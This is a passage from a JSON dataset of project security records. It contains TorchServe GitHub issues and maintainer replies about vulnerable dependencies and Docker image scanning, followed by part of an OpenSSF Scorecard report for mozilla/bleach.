/home/model-server/model-store                                                                 0.4s \r\n => [runtime-image 9/9] WORKDIR /home/model-server                                                                                                                                       0.0s \r\n => exporting to image                                                                                                                                                                  20.2s\r\n => => exporting layers                                                                                                                                                                 20.1s\r\n => => writing image sha256:e644d414385932c08844d932e1602b2de2d5eada8f4f8d0936bd478fe8e42b3f                                                                                             0.0s\r\n => => naming to docker.io/marksaroufim/torchserve:gpu-prod  \r\n```",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-01-12T18:31:39Z",
                        "url": "https://github.com/pytorch/serve/pull/2064#issuecomment-1380838118"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2064",
                    "merged_at": "2023-01-17T21:21:07Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/issues/2063",
                "title": "Remove dependency on future",
                "labels": [
                    "triaged",
                    "security"
                ],
                "user": "AndreasBergmeier6176",
                "issue_author_association": "CONTRIBUTOR",
                "number": 2063,
                "id": 1525683148,
                "state": "closed",
                "project_created_at": "2023-01-09T14:19:40Z",
                "closed_at": "2023-01-24T01:18:34Z",
                "body": "### 🐛 Describe the bug\n\nThere is an advisory due to the future package: https://github.com/advisories/GHSA-v3c5-jqr6-7qm8\r\nIt seems to me like the _future_ package serves no purpose anymore. See discussion in https://github.com/PythonCharmers/python-future/issues/612.\r\nIs it possible to solve the security problem by just removing the dependency on future and doing a new serve release?\r\n\r\nIn our project executing `poetry show --tree --why future` we get the output:\r\n```\r\ntorchserve 0.6.1 TorchServe is a tool for serving neural net models for inference\r\n└── future *\r\n```\n\n### Error logs\n\nSee above links.\n\n### Installation instructions\n\npoetry\n\n### Model Packaing\n\nNA\n\n### config.properties\n\nNA\n\n### Versions\n\n0.6.1\n\n### Repro instructions\n\nNA\n\n### Possible Solution\n\nPerhaps remove `future` line from dependencies.",
                "comments": [
                    {
                        "body": "Yeah this makes sense, we are doing a security centric release next so this is timely",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-01-09T23:17:33Z",
                        "url": "https://github.com/pytorch/serve/issues/2063#issuecomment-1376475692"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/issues/2056",
                "title": "Upgrade to PyTorch 1.13.1",
                "labels": [
                    "p0",
                    "security"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2056,
                "id": 1519153991,
                "state": "closed",
                "project_created_at": "2023-01-04T15:18:36Z",
                "closed_at": "2023-01-19T18:20:14Z",
                "body": "### 🚀 The feature\r\n\r\nPyTorch 1.13.1 has fixed a critical vulnerability with remote code execution. We currently have 17 such critical alerts from dependabot\r\n\r\nThis also means it's a good time to deprecate older versions of torch and potentially significantly cut down on the number of requirements.txt we need to support \r\n\r\nI don't believe running a comprehensive benchmark suite should block merging such a change since it's a patch release and security is more important than performance however it might be a good opportunity to automate everything about our benchmark suite\r\n\r\n### Motivation, pitch\r\n\r\nn\r\n\r\n### Alternatives\r\n\r\n_No response_\r\n\r\n### Additional context\r\n\r\n_No response_",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/issues/2042",
                "title": "Docker 0.7 Security issues ",
                "labels": [
                    "triaged",
                    "p0",
                    "security"
                ],
                "user": "jack-gits",
                "issue_author_association": "CONTRIBUTOR",
                "number": 2042,
                "id": 1506101217,
                "state": "closed",
                "project_created_at": "2022-12-21T10:47:35Z",
                "closed_at": "2023-01-18T23:03:02Z",
                "body": "### 🐛 Describe the bug\n\nwe found some security issues base of 0.7.0 release.\r\n\r\nbelow is the founds:\r\n![image](https://user-images.githubusercontent.com/30545972/208887170-07dd835a-46cd-4b04-b777-748f292a3e3d.png)\n\n### Error logs\n\n\r\nNone\n\n### Installation instructions\n\nFROM pytorch/torchserve:0.7.0-gpu\n\n### Model Packaing\n\nFROM pytorch/torchserve:0.7.0-gpu\n\n### config.properties\n\n_No response_\n\n### Versions\n\n0.7.0\n\n### Repro instructions\n\nNone\n\n### Possible Solution\n\n_No response_",
                "comments": [
                    {
                        "body": "Which tool are you using to find these vulnerabilities? docker scan?\r\n\r\nFor the 0.7 release we looked at issues highlighted by\r\n* https://deps.dev/pypi/torchserve\r\n* https://github.com/pytorch/serve/security/dependabot\r\n\r\nHappy to track more",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-12-21T18:37:27Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1361855781"
                    },
                    {
                        "body": "@msaroufim we're using AQUA CLOUD NATIVE.\r\n\r\nby the way, I can't open https://github.com/pytorch/serve/security/dependabot",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-12-22T02:58:00Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1362341797"
                    },
                    {
                        "body": "@msaroufim do you have plan to fix these security issues?",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-12-27T02:56:26Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1365570580"
                    },
                    {
                        "body": "Yeah but I'm on PTO and so is most of the team until the first week of January. Will find an owner then ",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-12-27T08:43:27Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1365717803"
                    },
                    {
                        "body": "I just enabled docker security scanning on dockerhub and should have the first report by tomorrow's nighlies\r\n\r\nEDIT: idk why it took half a day to enable scanning on dockerhub, scan should happen by tommorrow's nightlies so Jan 5 PST\r\n\r\nEDIT: OK it works! Most of the issues seem to be related to just using Ubuntu 20.04 and we should instead upgrade to ubuntu:rolling, working now on enabling automatic issue fixing with Snyk",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-01-03T21:35:00Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1370247299"
                    },
                    {
                        "body": "Can be fixed in next release or an urgent patch? ",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-09T08:11:06Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1375243192"
                    },
                    {
                        "body": "I'm not sure what the exit criteria would be since we don't use AQUA CLOUD NATIVE. I just enabled Snyk support and it looks like a large chunk of issues go away if we just use `ubuntu:rolling` instead, is that sufficient for you for now? #2064 #2065 #2066\r\n\r\nThese are all the security issues I'm tracking for next release https://github.com/pytorch/serve/issues?q=is%3Aissue+is%3Aopen+label%3Asecurity if there's anything more specific that we have to fix",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-01-10T00:00:21Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1376512958"
                    },
                    {
                        "body": "can you provide a docker image base on ubuntu:rolling now? I can help test it by AQUA CLOUD NATIVE.",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-10T10:46:29Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1377063545"
                    },
                    {
                        "body": "@msaroufim is it possible to provide a temporary docker image for security scanning?",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-12T05:24:48Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1379830546"
                    },
                    {
                        "body": "Pushed it here for you https://hub.docker.com/repository/docker/marksaroufim/torchserve/general it's the latest GPU image\r\n\r\nJust for reference you can build our docker images locally, this is the exact command we use for our nightlies \r\n\r\nhttps://github.com/pytorch/serve/blob/master/docker/docker_nightly.py#L37\r\n\r\nwith the full instructions here https://github.com/pytorch/serve/tree/master/docker\r\n\r\nSo for example in this case I ran \r\n\r\n```\r\n./build_image.sh -bt dev -b snyk-fix-e1077ba036875975fd0ab47e0f5bffb7 -g -cv cu117 -t marksaroufim/torchserve:gpu-latest\r\n```\r\n\r\nSo feel free to test this but in the future it might be more efficient for you to build locally, run whatever tests you like and then open up a PR if you see any issues",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-01-12T18:03:45Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1380796673"
                    },
                    {
                        "body": "great, thanks.",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-14T01:59:35Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1382631775"
                    },
                    {
                        "body": "Next nightlies should be using ubuntu:rolling https://github.com/pytorch/serve/pull/2065",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-01-17T19:04:06Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1385912609"
                    },
                    {
                        "body": "@msaroufim \r\nI'm trying to fix the security issues and PR. https://github.com/pytorch/serve/pull/2081\r\n\r\n",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-18T16:02:41Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1387311765"
                    },
                    {
                        "body": "There're still many security issues, for example linux-libc-dev, I have no idea how to fix it.\r\n\r\n![image](https://user-images.githubusercontent.com/30545972/213394268-22f0e378-a840-4d29-8a45-7cd709d182c5.png)\r\n",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-19T08:39:34Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1396619246"
                    },
                    {
                        "body": "@msaroufim any suggestion?",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-30T01:50:17Z",
                        "url": "https://github.com/pytorch/serve/issues/2042#issuecomment-1407868412"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/issues/1971",
                "title": "security issue",
                "labels": [
                    "triaged",
                    "dependencies",
                    "security"
                ],
                "user": "jack-gits",
                "issue_author_association": "CONTRIBUTOR",
                "number": 1971,
                "id": 1447883775,
                "state": "closed",
                "project_created_at": "2022-11-14T11:25:02Z",
                "closed_at": "2022-11-17T20:16:02Z",
                "body": "### 🐛 Describe the bug\n\nI found some security issues on pytorch/torchserve:0.6.0-gpu\r\n\r\nsecurity issues as below. \r\nwhether the torchseve support ubuntu 19.04? how to upgrade the os?\r\n\r\n![image](https://user-images.githubusercontent.com/30545972/201647738-cf3b5526-5277-4401-b928-86b5e954dcb5.png)\r\n\n\n### Error logs\n\n![Uploading image.png…]()\r\n\n\n### Installation instructions\n\nFROM pytorch/torchserve:0.6.0-gpu\n\n### Model Packaing\n\nFROM pytorch/torchserve:0.6.0-gpu\n\n### config.properties\n\n_No response_\n\n### Versions\n\nFROM pytorch/torchserve:0.6.0-gpu\n\n### Repro instructions\n\nFROM pytorch/torchserve:0.6.0-gpu\n\n### Possible Solution\n\n_No response_",
                "comments": [
                    {
                        "body": "We'll likely soon do a patch release where we upgrade the default to Ubuntu 20.04",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-11-14T15:15:30Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1313913776"
                    },
                    {
                        "body": "when the patch can be released?",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-14T16:30:22Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1314033944"
                    },
                    {
                        "body": "when the patch can be released?",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-14T16:30:55Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1314034651"
                    },
                    {
                        "body": "Team is focused on 0.6.1 release today, if that goes smoothly then we can discuss a patch release sometime before Dec 15 but need to confirm with rest of team first",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-11-14T16:39:30Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1314052961"
                    },
                    {
                        "body": "thanks for your information.  \r\nI'm really looking forward to this patch.",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-15T10:06:20Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1315078669"
                    },
                    {
                        "body": "@msaroufim  how to get the docker image of this patch? ",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-19T14:01:59Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1320892094"
                    },
                    {
                        "body": "use build_image.sh to build the image myself?",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-19T14:13:27Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1320894345"
                    },
                    {
                        "body": "For now yes but we will make a release in early December for you to get an official release ",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-11-19T14:26:34Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1320896959"
                    },
                    {
                        "body": "got it. thanks",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-19T15:12:04Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1320905277"
                    },
                    {
                        "body": "Ah the nightly docker images should work too",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-11-19T16:10:15Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1320916032"
                    },
                    {
                        "body": "@msaroufim \r\nI found the linux version is still ubuntu16.04; below is the information:\r\n\r\n**_docker run nvidia/cuda:11.6.0-cudnn8-runtime-ubuntu20.04_**\r\ncat /proc/version\r\nLinux version 4.4.0-1128-aws (buildd@lcy01-amd64-029) (gcc version 5.4.0 20160609 (**_Ubuntu 5.4.0-6ubuntu1~16.04.12_**) ) #142-Ubuntu SMP Fri Apr 16 12:42:33 UTC 2021\r\n\r\nbut gcc version is 20.04\r\n\r\n**_gcc -v_**\r\n\r\nUsing built-in specs.\r\nCOLLECT_GCC=gcc\r\nCOLLECT_LTO_WRAPPER=/usr/lib/gcc/x86_64-linux-gnu/9/lto-wrapper\r\nOFFLOAD_TARGET_NAMES=nvptx-none:hsa\r\nOFFLOAD_TARGET_DEFAULT=1\r\nTarget: x86_64-linux-gnu\r\nConfigured with: ../src/configure -v --with-pkgversion='Ubuntu 9.4.0-1 ubuntu1~ 20.04.1' --with-bugurl=file:///usr/share/doc/gcc-9/README.Bugs --enable-languages=c,ada,c++,go,brig,d,fortran,objc,obj-c++,gm2 --prefix=/usr --with-gcc-major-version-only --program-suffix=-9 --program-prefix=x86_64-linux-gnu- --enable-shared --enable-linker-build-id --libexecdir=/usr/lib --without-included-gettext --enable-threads=posix --libdir=/usr/lib --enable-nls --enable-clocale=gnu --enable-libstdcxx-debug --enable-libstdcxx-time=yes --with-default-libstdcxx-abi=new --enable-gnu-unique-object --disable-vtable-verify --enable-plugin --enable-default-pie --with-system-zlib --with-target-system-zlib=auto --enable-objc-gc=auto --enable-multiarch --disable-werror --with-arch-32=i686 --with-abi=m64 --with-multilib-list=m32,m64,mx32 --enable-multilib --with-tune=generic --enable-offload-targets=nvptx-none=/build/gcc-9-Av3uEd/gcc-9-9.4.0/debian/tmp-nvptx/usr,hsa --without-cuda-driver --enable-checking=release --build=x86_64-linux-gnu --host=x86_64-linux-gnu --target=x86_64-linux-gnu\r\nThread model: posix\r\n**_gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)_** \r\n\r\n",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-19T19:55:10Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1320957441"
                    },
                    {
                        "body": "another issue:\r\nduring registering my model, I run the check , but it failed and raised an error \"CUBLAS_STATUS_INVALID_VALUE\".\r\n```\r\n`2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -   File \"/home/model-server/tmp/models/fb396cbe11634159a8d30eea322582cb/inference-handler.py\", line 32, in __init__\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -     paddle.utils.run_check()\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -   File \"/home/venv/lib/python3.8/site-packages/paddle/utils/install_check.py\", line 266, in run_check\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -     _run_static_single(use_cuda, use_xpu, use_npu)\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -   File \"/home/venv/lib/python3.8/site-packages/paddle/utils/install_check.py\", line 171, in _run_static_single\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -     exe.run(train_prog,\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -   File \"/home/venv/lib/python3.8/site-packages/paddle/fluid/executor.py\", line 1299, in run\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -     six.reraise(*sys.exc_info())\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -   File \"/home/venv/lib/python3.8/site-packages/six.py\", line 719, in reraise\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -     raise value\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -   File \"/home/venv/lib/python3.8/site-packages/paddle/fluid/executor.py\", line 1285, in run\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -     res = self._run_impl(\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -   File \"/home/venv/lib/python3.8/site-packages/paddle/fluid/executor.py\", line 1464, in _run_impl\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -     return new_exe.run(list(feed.keys()), fetch_list, return_numpy)\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -   File \"/home/venv/lib/python3.8/site-packages/paddle/fluid/executor.py\", line 547, in run\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -     tensors = self._new_exe.run(feed_names, fetch_list)._move_to_list()\r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG - OSError: (External) CUBLAS error(7). \r\n2022-11-20T11:18:59,006 [INFO ] W-9004-neuron-ocr_release-2022-11-19-stdout MODEL_LOG -   [Hint: 'CUBLAS_STATUS_INVALID_VALUE'.  An unsupported value or parameter was passed to the function (a negative vector size, for example). To correct: ensure that all the parameters being passed have valid values. ] (at /paddle/paddle/phi/kernels/funcs/blas/blas_impl.cu.h:35)\r\n```\r\n`\r\nbut when I login the docker and run the check by command line, the check passed.\r\n```\r\n`>>> import paddle\r\n>>> paddle.utils.run_check()\r\nRunning verify PaddlePaddle program ... \r\npaddle.is_compiled_with_cuda() True\r\nuse_cuda True\r\nfetch_list ['sum_0.tmp_0', 'create_parameter_0.w_0@GRAD']\r\nfeed_names ['input']\r\nPaddlePaddle works well on 1 GPU.\r\nPaddlePaddle works well on 1 GPUs.\r\nPaddlePaddle is installed successfully! Let's start deep learning with PaddlePaddle now.\r\n>>> `\r\n```\r\n",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-20T13:53:28Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1321138794"
                    },
                    {
                        "body": "Do you have a repro you could share? Cc @agunapal ",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-11-20T16:50:10Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1321181592"
                    },
                    {
                        "body": "when I checked the docker history, I found libcublas(version: 11.8.1.74-1 ) is used for cuda11.6. I'm not sure whether it's the  reason.\r\n\r\n![image](https://user-images.githubusercontent.com/30545972/202952808-5830b253-ef1e-4c83-9da1-61ada1a1282b.png)\r\n",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-21T02:50:15Z",
                        "url": "https://github.com/pytorch/serve/issues/1971#issuecomment-1321383526"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/issues/1860",
                "title": "torchserve-kfs docker image upgrade to kserve v0.9.0",
                "labels": [
                    "triaged",
                    "kubernetes",
                    "p0",
                    "security"
                ],
                "user": "mansigoel",
                "issue_author_association": "NONE",
                "number": 1860,
                "id": 1371646274,
                "state": "closed",
                "project_created_at": "2022-09-13T15:34:00Z",
                "closed_at": "2022-11-29T01:27:45Z",
                "body": "Kserve v0.9.0 release fixes log4j security vulnerability issue: https://github.com/kserve/kserve/releases/tag/v0.9.0 \r\ntorchserve-kfs 0.6.0 docker image currently uses kserve v0.8.0\r\nCan we please upgrade the kserve version and release a new version of torchserve-kfs docker image to address the log4j vulnerability issue?\r\n",
                "comments": [
                    {
                        "body": "@jagadeeshi2i were you planning on taking a look at this? We can include it by our next patch release in early december",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-11-15T16:56:21Z",
                        "url": "https://github.com/pytorch/serve/issues/1860#issuecomment-1315601540"
                    },
                    {
                        "body": "Sure @msaroufim will bump the kserve version. ",
                        "user": "jagadeeshi2i",
                        "issue_author_association": "COLLABORATOR",
                        "project_created_at": "2022-11-15T16:59:13Z",
                        "url": "https://github.com/pytorch/serve/issues/1860#issuecomment-1315605521"
                    }
                ],
                "pull_request": null
            }
        ],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Scope of practice",
            "User guideline",
            "User guideline",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 16,
        "num_noncompliant_security_pull": 18,
        "has_generic_policy": true
    },
    {
        "project_name": "mozilla/bleach",
        "project_url": "https://github.com/mozilla/bleach",
        "SSF": {
            "date": "2024-10-29T23:05:34+07:00",
            "repo": {
                "name": "github.com/mozilla/bleach",
                "commit": "156c5898b3b20e4a582b4a366c18355ecad477cf"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 6.8,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'main'",
                        "Info: 'force pushes' disabled on branch 'main'",
                        "Warn: required approving review count is 1 on branch 'main'",
                        "Warn: codeowners review is required - but no codeowners file found in repo",
                        "Info: status check found to merge onto on branch 'main'",
                        "Info: PRs are required in order to make changes on branch 'main'"
                    ],
                    "score": 8,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 9,
                    "reason": "20 out of 21 merged PRs checked by a CI test -- score normalized to 9",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "Found 0/18 approved changesets -- score normalized to 0",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: django-mptt contributor org/company found, python-ldap contributor org/company found, python-distro contributor org/company found, pyvideo contributor org/company found, unitedstates contributor org/company found, mobbler contributor org/company found, flake8-implicit-str-concat contributor org/company found, deadsetbit contributor org/company found, railsadminteam contributor org/company found, requests contributor org/company found, fastly contributor org/company found, fatiando contributor org/company found, pylast contributor org/company found, WahKazoo contributor org/company found, termcolor contributor org/company found, TodaysMeet contributor org/company found, mdxs contributor org/company found, urllib3 contributor org/company found, python contributor org/company found, jazzband contributor org/company found, citybikes contributor org/company found, ultrajson contributor org/company found, adobe contributor org/company found, FactoryBoy contributor org/company found, Pioneer-Valley-Books contributor org/company found, pyblosxom contributor org/company found, keysafe-cloud contributor org/company found, whyaretheflagsup contributor org/company found, NaPoGenMo contributor org/company found, endoflife-date contributor org/company found, cycle148hki contributor org/company found, pyparsing contributor org/company found, django-auth-ldap contributor org/company found, pioneer valley books contributor org/company found, mozilla contributor org/company found, gae-init contributor org/company found, python-pillow contributor org/company found, nordsoftware contributor org/company found, helsinki-python contributor org/company found, pytest-dev contributor org/company found, NaNoGenMo contributor org/company found, python-humanize contributor org/company found, python-twitter-tools contributor org/company found, django contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 44 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Info: OSSFuzz integration found"
                    ],
                    "score": 10,
                    "reason": "project is fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Warn: project license file does not contain an FSF or OSI license."
                    ],
                    "score": 9,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "6 commit(s) and 9 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yml:16: update your workflow using https://app.stepsecurity.io/secureworkflow/mozilla/bleach/test.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yml:19: update your workflow using https://app.stepsecurity.io/secureworkflow/mozilla/bleach/test.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yml:29: update your workflow using https://app.stepsecurity.io/secureworkflow/mozilla/bleach/test.yml/main?enable=pin",
                        "Warn: pipCommand not pinned by hash: bleach/_vendor/vendor_install.sh:11",
                        "Warn: pipCommand not pinned by hash: .github/workflows/test.yml:40",
                        "Warn: pipCommand not pinned by hash: .github/workflows/test.yml:41",
